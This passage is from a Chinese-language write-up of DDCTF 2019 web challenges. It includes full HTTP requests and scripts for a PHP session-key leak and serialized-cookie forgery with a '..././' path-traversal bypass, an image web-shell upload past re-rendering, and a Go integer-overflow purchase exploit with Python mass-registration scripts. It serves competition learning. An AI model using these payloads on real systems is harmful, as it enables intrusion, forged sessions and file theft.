class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure>
+<p>审计后的总体思路如下：</p>
+<p>主体为<code>Session.php</code>，调用了<code>Session</code>类中的<code>index</code>方法，其中<code>Session</code>类继承了<code>Application</code>类</p>
+<p>首先，调用<code>Application</code>类中的<code>auth</code>方法，必须返回<code>true</code>才能执行下面的语句，<code>auth</code>方法返回true的条件为：<code>!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN</code>，即头部字段<code>didictf_username:admin</code>，这是个大前提</p>
+<p>接下来调用<code>get_key</code>方法，可以发现该方法给出了注释部分的提示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>提示flag和eancrykey都在<code>../config</code>文件夹下，并从<code>key.txt</code>取出加密的<code>key</code></p>
+<p>下一步就是调用<code>session_read</code>方法，如果返回true则返回的json信息中包含<code>DiDI Welcome you $_SERVER[&#39;HTTP_USER_AGENT&#39;]</code>，如果返回false则包含信息<code>DiDI Welcome you</code>，并且调用<code>session_create</code>方法，我们继续审计<code>session_read</code>方法，在其中我们可以发现其中的if语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看出，如果执行该if语句里的内容，可以得到加密的参数<code>eancrykey</code>，我们必须要让其执行，那么这个语句前面所有的条件都必须符合：<br>（1）cookie值不能为空</p>
+<p>（2）cookie字段中必须包含参数<code>ddctf_id</code></p>
+<p>（3）<code>$hash === md5($this-&gt;eancrykey.$session))</code></p>
+<p>前面两个条件都很好满足，关键在于最后一个条件，参数<code>hash</code>和<code>session</code>分别来自下列语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">$session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br></pre></td></tr></table></figure>
+<p>我们知道，<code>substr</code>函数中的参数<code>$session</code>是来自于cookie字段中的参数<code>ddctf_id</code>的值，所以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$hash = 变量session截取strlen($session)-32位 ~ 最后一位</span><br><span class="line">$session = 变量session截取 开始位 ~ strlen($session)-32位</span><br></pre></td></tr></table></figure>
+<p>因为我们是不知道<code>eancrykey</code>的值，所以无法构造一个参数<code>session</code>能符合第三个条件，但是我们可以注意到当<code>session_read</code>方法返回false时，会执行方法<code>session_create</code>，继续跟进该方法，会发现方法的最后执行了<code>setcookie</code>，内容参数<code>$cookiedata</code>为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line">$cookiedata = serialize($userdata);</span><br><span class="line">$cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br></pre></td></tr></table></figure>
+<p>最终<code>cookiedata</code>的值即为<code>userdata</code>序列化后的值拼接上md5加密后的<code>eancrykey</code>拼接上序列化值</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/ddctf/5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>如上图所示，符合大前提<code>didictf_username</code>，但是未设置cookie值，就会执行<code>session_create</code>设置cookie值，而字段<code>ddctf_id</code>的值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ddctf_id=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22495e31ab571f67c3c4ec41915d106c08%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22202.101.138.82%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A109%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F73.0.3683.86+Safari%2F537.36%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D476e0efa4918bdfe3b0bbfdf499e75ac</span><br></pre></td></tr></table></figure>
+<p>经过url解码后为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:10:&quot;session_id&quot;;s:32:&quot;495e31ab571f67c3c4ec41915d106c08&quot;;s:10:&quot;ip_address&quot;;s:14:&quot;202.101.138.82&quot;;s:10:&quot;user_agent&quot;;s:109:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;&#125;476e0efa4918bdfe3b0bbfdf499e75ac</span><br></pre></td></tr></table></figure>
+<p>可以看到32位的字符串<code>476e0efa4918bdfe3b0bbfdf499e75ac</code>这个即为加密的盐（参数<code>eancrykey</code>）与序列化值<code>a:4:{s:10:&quot;session_id&quot;;s:32:&quot;495e31ab571f67c3c4ec41915d106c08&quot;;s:10:&quot;ip_address&quot;;s:14:&quot;202.101.138.82&quot;;s:10:&quot;user_agent&quot;;s:109:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;}</code>拼接后的md5加密值，首先想到的是拿去md5解密网站上进行解密得到key，但是解密失败</p>
+<p>虽然无法解密直接得到key，但是在<code>session_read</code>方法中，我们同样可以得到key，条件则是如前面所提到的，符合<code>$hash === md5($this-&gt;eancrykey.$session))</code></p>
+<p>可以发现，<code>session_create</code>方法得到的<code>ddctf_id</code>字段值正好符合这个条件：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/ddctf/6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>从响应结果来看，说明<code>session_read</code>方法返回true，说明符合了前面的所有条件，那么最后要得到key，需要的条件为POST一个参数<code>nickname</code>，该参数与key加入一个数组<code>$arr</code>，通过遍历该数组对字符串<code>Welcome my friend %s</code>进行字符替换，由于参数<code>nickname</code>为数组第一个元素，所以第一个替换的为<code>nickname</code>的值，替换一次后，要想再替换上key，则<code>nickname</code>的值中必须包含<code>%s</code>，所以，最终得到key的payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /app/Session.php HTTP/1.1</span><br><span class="line">Host: 117.51.158.44</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">didictf_username:admin</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Cookie:ddctf_id=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22495e31ab571f67c3c4ec41915d106c08%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22202.101.138.82%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A109%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F73.0.3683.86+Safari%2F537.36%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D476e0efa4918bdfe3b0bbfdf499e75ac</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">nickname=%s</span><br></pre></td></tr></table></figure>
+<p>得到的key为：<code>EzblrbNS</code></p>
+<p>但这只是key，要想得到flag，我们必须利用前面读取出<code>key</code>的函数<code>file_get_contents</code>读取<code>../config/flag.txt</code>才能最终获取flag，这就需要利用到<code>session_read</code>方法中的反序列化语句<code>$session = unserialize($session);</code></p>
+<p>那么接下来就需要寻找可以利用反序列化进行修改的参数，在类<code>Application</code>的方法<code>__destruct</code>中，发现语句：<code>$this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;);</code>，存在可以利用的参数<code>$path</code>，追溯该参数来源，发现<code>path</code>经过函数<code>sanitizepath</code>过滤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并且需要满足条件：<code>strlen($path) === 18</code>，才可以执行上述语句进行文件读取</p>
+<p>所以，思路很清晰了，通过参数<code>session</code>进行反序列化改变参数<code>path</code>的值读取文件<code>../config/flag.txt</code></p>
+<p>要进行反序列化，同样要满足我们一开始提到的得到key的三个条件，但是这里我们已经知道了key，所以很容易就可以控制参数<code>session</code></p>
+<p>获得序列化值的代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Appliacation</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session = <span class="keyword">new</span> Application();</span><br><span class="line">$session-&gt;path = <span class="string">"..././config/flag.txt"</span></span><br><span class="line"><span class="keyword">echo</span> serialize($session);</span><br></pre></td></tr></table></figure>
+<p>获得到的序列化值为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来将key与序列化值进行拼接后进行md5加密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo md5(&apos;EzblrbNS&apos;.$session);</span><br></pre></td></tr></table></figure>
+<p>加密后的值为<code>5a014dbe49334e6dbb7326046950bee</code></p>
+<p>那么session值就为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;&#125;5a014dbe49334e6dbb7326046950bee</span><br></pre></td></tr></table></figure>
+<p>最终获取flag的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /app/Session.php HTTP/1.1</span><br><span class="line">Host: 117.51.158.44</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">didictf_username:admin</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Cookie:ddctf_id=O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;%3bs:21:&quot;..././config/flag.txt&quot;%3b&#125;5a014dbe49334e6dbb7326046950bee2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>flag：<code>DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</code></p>
+<h4 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h4><p>题目链接：<a href="http://117.51.148.166/upload.php" target="_blank" rel="noopener">http://117.51.148.166/upload.php</a> </p>
+<p>很清晰的一道文件上传题，尝试上传php一句话，抓包修改<code>Content-type</code>字段为<code>image/jpeg</code>，修改文件名后缀名为jpg都无法上传，提示<code>请上传JPG/GIF/PNG格式的图片文件</code>，猜测后台是对上传的文件内容进行了检查，上传图片马中包含<code>phpinfo</code>，却提示<code>[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()</code>，将上传后的图片下载下来，与原来图片比较发现<code>phpinfo</code>不见了，说明对上传的图片进行了二次渲染，类似于upload-labs中的一道绕过二次渲染题目</p>
+<p>绕过二次渲染上传图片马参考地址：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></p>
+<p>使用其中生成jpg图片的php脚本，过程为向服务器任意上传一个jpg文件，将上传成功的jpg文件下载下来，命名为1.jpg，再运行脚本，命令为:php jpg_payload.php 1.jpg</p>
+<p> <img src="\img\ddctf\7.png" alt=""></p>
+<p> 在目录下生成加入图片马的jpg图片，我们可以在16进制编辑器打开验证：</p>
+<p> <img src="\img\ddctf\8.png" alt=""></p>
+<p> 成功插入phpinfo信息，再次在服务器中上传该图片马</p>
+<p> <img src="\img\ddctf\9.png" alt=""></p>
+<p> 成功获得flag</p>
+<p> 另外png的图片同样可以通过参考链接中的其他脚本生成图片马，gif文件则需要比较前后图片的相同之处即imagecreatefromgif函数未修改的部分，比较麻烦一点</p>
+<p>flag：<code>DDCTF{B3s7_7ry_php1nf0_f2a042657ff79fad}</code></p>
+<h4 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h4><p>题目链接：<a href="http://117.51.147.155:5050/index.html#/login" target="_blank" rel="noopener">http://117.51.147.155:5050/index.html#/login</a> </p>
+<p>这题有点类似护网杯的买辣条，抓包发现Cookie带有<code>REVEL_SESSION</code>，说明是<strong>go语言</strong>，继续抓取购买吃鸡入场券的包时，发现有参数<code>ticket_price=2000</code>，可是我们的余额只有100，明显无法购买入场券，后台的代码逻辑可能为<code>用户存款 -  （吃鸡入场券数×入场券价格 ） &gt;= 0</code> ，尝试修改ticket_price=100，无法生成订单，通过二分法尝试，只有大于等于1000时才能生成订单,这就想起了go语言的最大整数溢出漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">有符号整数类型</span><br><span class="line">int8 有符号的8位整数，范围 -128 到127</span><br><span class="line">int16 有符号的16位整数，范围 -32768 到 32767</span><br><span class="line">int32 有符号的32位整数，范围 -2147483648 到 2147483647</span><br><span class="line">int64 有符号的64位整数，范围 -9223372036854775808 到 9223372036854775807</span><br><span class="line">uint8 无符号8位整数，范围 0 到 255</span><br><span class="line">uint16 无符号16位整数，范围 0 到 65535</span><br><span class="line">uint32 无符号32位整数，范围 0 到 4294967295</span><br><span class="line">uint64 无符号64位整数，范围 0 到 18446744073709551615</span><br></pre></td></tr></table></figure>
+<p>正如上面所列出的go语言各类整数的范围，我们一个个尝试，尝试ticket_price=4294967296，即uint32 无符号32位整数值加1时，能成功购买入场券，并且余额并没有减少，还是100，这就说明了4294967296发生了溢出，变为了0，满足上面的逻辑判断</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ddctf\10.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>购买成功后，获得本账号的id和ticket，并且提示需要移除100位对手才能最终吃鸡，很明显需要我们写脚本进行注册并移除，注册100位账户的脚本register.py代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">password = <span class="string">"12345678"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">1101</span>):</span><br><span class="line">    name = <span class="string">"test"</span></span><br><span class="line">    name = name + str(i)</span><br><span class="line">    url = <span class="string">"http://117.51.147.155:5050/ctf/api/register?name=%s&amp;password=%s"</span>%(name,password)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure>
+<p>注册100位后，我们需要再通过脚本分别对这100位用户进行登录，获取吃鸡入场券订单，购买订单，最后提取出各自分别的id和ticket，以上这些步骤都分别需要观察每个步骤的响应包json字段内容来判断是否提交成功以及提取id和ticket的信息，chiji.py代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">list_your_id = []</span><br><span class="line">list_your_ticket = []</span><br><span class="line"></span><br><span class="line">password = <span class="string">"12345678"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">1200</span>):</span><br><span class="line">    name = <span class="string">"test"</span> + str(i)</span><br><span class="line">    url1 = <span class="string">"http://117.51.147.155:5050/ctf/api/login?name=%s&amp;password=%s"</span>%(name,password)</span><br><span class="line">    r1 = s.get(url1)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"code":200'</span> <span class="keyword">in</span> r1.text: <span class="comment">#login successfully</span></span><br><span class="line">        ticket_price = <span class="number">4294967296</span></span><br><span class="line">        url2 = <span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=%d"</span>%(ticket_price)</span><br><span class="line">        r2 = s.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'"ticket_price":'</span> <span class="keyword">in</span> r2.text: <span class="comment">#get bill successfully</span></span><br><span class="line">            bill_id = re.findall(<span class="string">r'"bill_id":"(.*)",'</span>,r2.text)[<span class="number">0</span>]</span><br><span class="line">            url3 = <span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s"</span>%(bill_id)</span><br><span class="line">            r3 = s.get(url3)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'your_id'</span> <span class="keyword">and</span> <span class="string">'your_ticket'</span> <span class="keyword">in</span> r3.text: <span class="comment">#get ticket successfully</span></span><br><span class="line">                your_id = re.findall(<span class="string">r'"your_id":(.*),"your'</span>,r3.text)[<span class="number">0</span>]</span><br><span class="line">                your_ticket = re.findall(<span class="string">r'"your_ticket":"(.*)"&#125;]'</span>,r3.text)[<span class="number">0</span>]</span><br><span class="line">                list_your_id.append(your_id)</span><br><span class="line">                print(list_your_id)</span><br><span class="line">                list_your_ticket.append(your_ticket)</span><br><span class="line">                print(list_your_ticket)</span><br><span class="line">    <span class="keyword">if</span> len(list_your_id) <span class="keyword">and</span> len(list_your_ticket) == <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#chiji</span></span><br><span class="line">url4 = <span class="string">"http://117.51.147.155:5050/ctf/api/login?name=test01&amp;password=12345678"</span></span><br><span class="line">r4 = s.get(url4)</span><br><span class="line">print(r4.text)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    url5 = <span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s"</span>%(list_your_id[i],list_your_ticket[i])</span><br><span class="line">    r5 = s.get(url5)</span><br><span class="line">    print(r5.text)</span><br></pre></td></tr></table></figure>
+<p>经过测试，需要多次分批注册100个账号，即多次运行该脚本提交，才最终挤掉100位对手，猜测可能是存在提交信息过快导致服务器会来不及处理而导致提交失败的问题</p>
+<p>最终吃鸡页面</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ddctf\11.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>flag：<code>DDCTF{chiken_dinner_hyMCX[n47Fx)}</code></p>
+<h4 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h4><p>题目链接：<a href="http://116.85.48.107:5002/d5af31f66147e857" target="_blank" rel="noopener">http://116.85.48.107:5002/d5af31f66147e857</a></p>
+<p>题目给了服务器端源码，是一个python写的Flask框架，分析代码，通过GET方式接收我们输入的参数，格式为<code>action:ACTION;ARGS0#ARGS1#ARGS2......</code>，要得到flag就是要执行最后的函数<code>get_flag_handler</code>，当满足session中的<code>num_items</code>字段大于等于5的条件时，会返回函数<code>FLAG</code> ，即得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">		trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">	trigger_event(<span class="string">'action:view;index'</span>)</span><br></pre></td></tr></table></figure>
+<p> 但是如果按代码正常的逻辑来看，<code>num_items</code>的默认字段值为0，需要用session中的另一个字段<code>points</code>的值来换取，然而<code>points</code>初始化值为3</p>
+<p>这是<code>session</code>中字段的初始化的代码段：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">	querystring = urllib.unquote(request.query_string)</span><br><span class="line">	request.event_queue = []</span><br><span class="line">	<span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">		querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">		session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">		session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">		session[<span class="string">'log'</span>] = []</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
+<p>这是<code>num_items</code>和<code>points</code>字段值交换的代码段：</p>
